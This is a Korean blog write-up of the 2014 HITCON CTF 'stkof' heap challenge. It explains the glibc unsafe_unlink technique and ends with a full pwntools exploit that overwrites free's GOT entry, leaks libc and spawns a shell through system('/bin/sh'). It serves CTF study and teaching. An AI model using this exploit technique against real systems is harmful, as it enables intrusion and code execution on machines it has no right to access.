---
layout: post
title: "[2014 hitcon-ctf] stkof 풀이"
date: 2018-09-20 04:44
categories: "[Pwn]CTF"
tags: rotles98
---

>### `nc 54.64.45.35 3573`
### [stkof](https://github.com/ctfs/write-ups-2014/raw/master/hitcon-ctf-2014/stkof/a679df07a8f3a8d590febad45336d031-stkof)

### Hint:

>### System Information: Hardware: EC2 r3.2xlarge Environment: default Ubuntu 14.04 x64<br /><br />
### BTW, also the EC2 server is strong, we still set alarm and cgroup memory to prevent DoS attack. Don't be surprised if your connection be closed unexceptedly.

`unsafe_unlink` 문제!

**참고** `glibc` 버전이 `2.26`보다 낮아야 `unsafe_unlink`를 사용할 수 있어요. (제가 사용중인 `ubuntu 16.04.5 64bit`는 `glibc 2.23`이에요.)

`unsafe_unlink`는 `fake_chunk`를 만들 수 있고 `prev_size`, `prev_inuse`를 바꿀 수 있고 `chunk`의 주소를 가지는 `bss`나 `stack` 같은 곳의 주소를 알 때 사용할 수 있어요.

- - -
# 0x00. 분석

{: refdef: style="text-align: center;"}
![checksec](/img/2014_hitcon-ctf/stkof/01.png)
{: refdef}

힙 공부하면서 느낀건 `PIE`나 `FULL RELRO`만 아니면 보호기법 없는거나 마찬가지라 편함!

`IDA`로 열어보면 네 가지 함수를 사용할 수 있어요.

### `func_malloc`

1. `size`만큼 `malloc`

2. `index` 1 증가

2. `chunk_list[index]`에 `chunk `주소 저장

### `func_read`

1. `index`, `size` 입력

2. `chunk` 크기에 상관없이 입력받음 **bof**

### `func_free`

1. `index` 입력

2. 해당 `chunk`를 `free`한 후 `chunk[index]`을 초기화 (`index`를 감소시키지는 않음)


### `func_len_check`

1. `index` 입력

2. 해당 `chunk`를 `strlen`해서 **3** 이하면 "//TODO" 이 외엔 "..." 출력

함수들 쭉 보면 **bof**도 있고 `free`도 있어서 다 던져주고 하고 싶은거 다 해보라는 문제네요.

- - -
# 0x01. unsafe_unlink

`free`를 할 때 `prev_inuse`가 `0`이면 `prev_size`를 참고해서 `unlink`가 실행돼요.

그레서 `fake_chunk`를 만들어두고 `prev_size` 값을 `fake_chunk` 쪽으로, `prev_inuse`를 `0`으로 해주고 해당 `chunk`를 `free`해주면 끝이에요. 짱쉽죠?

{: refdef: style="text-align: center;"}
![unlink](/img/2014_hitcon-ctf/stkof/02.png)
{: refdef}

>https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c

원레 `fake_chunk`가 있으면 그 밑 `chunk`가 `fake_chunk`랑 합쳐져서 크기가 커지는게 지금 실행되는 `unlink`의 목적이에요.

그래서 기존에 `fake_chunk`가 **fd** <-> **fake_chunk** <-> **bk** 이렇게 연결됐다고 생각하고 위 코드를 보면 **P**는 `fake_chunk`를 뜻한다는걸 알 수 있어요.

**1421**, **1422** 부분이 실질적인 `unlink`인데 그 전에 **1418**에서 검사하는게 있어요.

`fake_chunk -> fd -> bk == fake_chunk`, `fake_chunk -> bk -> fd == fake_chunk` 이렇게 두 가지를 검사해요.

**bss**에 `chunk_list`라는 `chunk`의 주소를 모아두는 배열이 있으니까 그걸 적당히 넣어주면 돼요.

```python
func_malloc(0x18) # 1
func_malloc(0x108) # 2
func_malloc(0x108) # 3

payload = p64(0x0) # fake_chunk -> prve_size
payload += p64(0x0) # fake_chunk -> size
payload += p64(chunk_list + 0x10 - 0x18) # fack_chunk -> fd
payload += p64(chunk_list + 0x10 - 0x10) # fake_chunk -> bk
payload += "\x00"*0xe0
payload += p64(0x100) # 3 -> prve_size -> fake_chunk
payload += p64(0x110) # 3 -> size, prev_inuse flag = 0
func_read(2, payload)
```

위 코드를 보면 `2 chunk`의 `size`는 `0x110`이라서 원래는 `3 chunk`의 `prev_size`는 `0x110`이 정상인데 `0x100`으로 넣어준걸 볼 수 있어요.

`chunk_list + 0x10`은 `2 chunk`의 데이터 부분을 가르키는데 이 부분은 `fake_chunk`의 `header`주소랑 같아요.

`-0x18`, `-0x10`을 한 이유는 `unlink` 전에 검사하는 부분 때문이에요.

`fake_chunk`의 `fd` 부분에 `자신의 주소가 적힌 주소 - 0x18`을 적어주면 `fake_chunk -> fd -> bk`에서 `fake_chunk -> fd`가 `&fake_chunk - 0x18`이랑 같아지고 `&fake_chunk - 0x18 -> bk`는 `fake_chunk`랑 같아져요.

왜냐하면 `chunk`의 생김새를 보면 **[prev_size] [size] [fd] [bk]** 이렇게 생겨서 `특정 주소`의 `fd`는 `*(특정 주소 + 0x10)`이랑 같아요. 마찬가지로 `bk`는 `+ 0x18`이랑 같아요.

{: refdef: style="text-align: center;"}
![fake_chunk](/img/2014_hitcon-ctf/stkof/03.png)
![chunk_list](/img/2014_hitcon-ctf/stkof/04.png)
{: refdef}

이제 `3 chunk`를 `free`하면 `unlink`가 실행돼요. 그러면 **1421**코드가 실행되면서 `chunk_list + 0x10 = chunk_list + 0x10 - 0x10`이 됐다가 **1422**코드가 실행되면 다시 `chunk_list + 0x10 = chunk_list + 0x10 - 0x18`이 들어가요.

결론은 `chunk_list - 0x8`부터 원하는 값을 넣을 수 있어요.

`chunk_list`의 값을 바꿀 수 있으면 원하는 곳에서 `func_read`를 실행시킬 수 있어요.

- - -
# 0x02. 공격 방법

`chunk`의 주소를 마음대로 바꿀 수 있고 `FULL RELRO`도 아니니까 `함수 got`를 `chunk`주소로 적어두고 그 값들을 조작할 거에요.

1. `1 chunk` = `free_got`, `2 chunk` = `puts_got`

2. `func_read`로 `free_got`에 `puts_plt` 삽입

3. `func_free(2)`로 `puts(puts_got)`실행 -> `libc_leak`

4. 2처럼 `free_got`에 `libc_system` 삽입

5. 새로운 `chunk`를 받아서 그 안에 "/bin/sh\0" 문자열넣고 `free` -> `system("/bin/sh\0")`

6. 따란~

- - -
# 0x03. 익스플로잇

```python
from pwn import *
#context.log_level = "debug"

HOST = "192.168.0.19"
#HOST = "54.64.45.35"
PORT = 4444
#PORT = 3573

s = remote(HOST, PORT)
pause()

elf = ELF("./stkof")
libc = ELF("./libc.so.6")

free_got = elf.got["free"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

puts_off = libc.symbols["puts"]
system_off = libc.symbols["system"]

chunk_list = 0x602140

def func_malloc(size):
    s.sendline("1")
    s.sendline(str(size))

    s.recvuntil("OK\n")

def func_read(index, content):
    s.sendline("2")
    s.sendline(str(index))
    s.sendline(str(len(content)))
    s.send(content)

    s.recvuntil("OK\n")

def func_free(index):
    s.sendline("3")
    s.sendline(str(index))

func_malloc(0x18)
func_malloc(0x108)
func_malloc(0x108)

payload = p64(0x0) # fake_chunk -> prve_size
payload += p64(0x0) # fake_chunk -> size
payload += p64(chunk_list + 0x10 - 0x18) # fack_chunk -> fd
payload += p64(chunk_list + 0x10 - 0x10) # fake_chunk -> bk
payload += "\x00" * 0xe0
payload += p64(0x100) # prve_size -> fake_chunk
payload += p64(0x110) # size, flag = 0
func_read(2, payload)

func_free(3)
s.recvuntil("OK\n")

payload = "\x00" * 0x10
payload += p64(free_got) # 1
payload += p64(puts_got) # 2
func_read(2, payload)

func_read(1, p64(puts_plt))

func_free(2) # libc_leak
libc_puts = u64(s.recvuntil("\x7f").ljust(8, "\x00"))
s.recvuntil("OK\n")

libc_base = libc_puts - puts_off
libc_system = libc_base + system_off

print
log.info("libc_base : " + hex(libc_base))
log.info("libc_puts : " + hex(libc_puts))
log.info("libc_system : " + hex(libc_system))
print

func_read(1, p64(libc_system))

func_malloc(0x18)
func_read(4, "/bin/sh\0")
func_free(4)

s.interactive()
```

### HITCON{ASZ0_H4eP_0VerFlOw_317H_sTrAn9e}
